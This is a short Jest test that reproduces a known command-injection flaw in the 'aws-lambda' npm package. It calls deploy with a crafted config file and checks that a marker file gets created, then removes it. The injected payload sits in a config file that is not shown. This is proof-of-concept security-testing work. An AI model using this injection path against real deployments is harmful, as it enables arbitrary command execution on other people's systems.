// aws-lambda-config.lambda
//https://snyk.io/vuln/SNYK-JS-AWSLAMBDA-540839
test("Command Injection in aws-lambda", () => 
{
	const root = require("aws-lambda");
	const fs = require('fs');
	const path = './aws-lambda';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    root.deploy("aws-lambda-config",function() {

		sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation

	});
	
	
});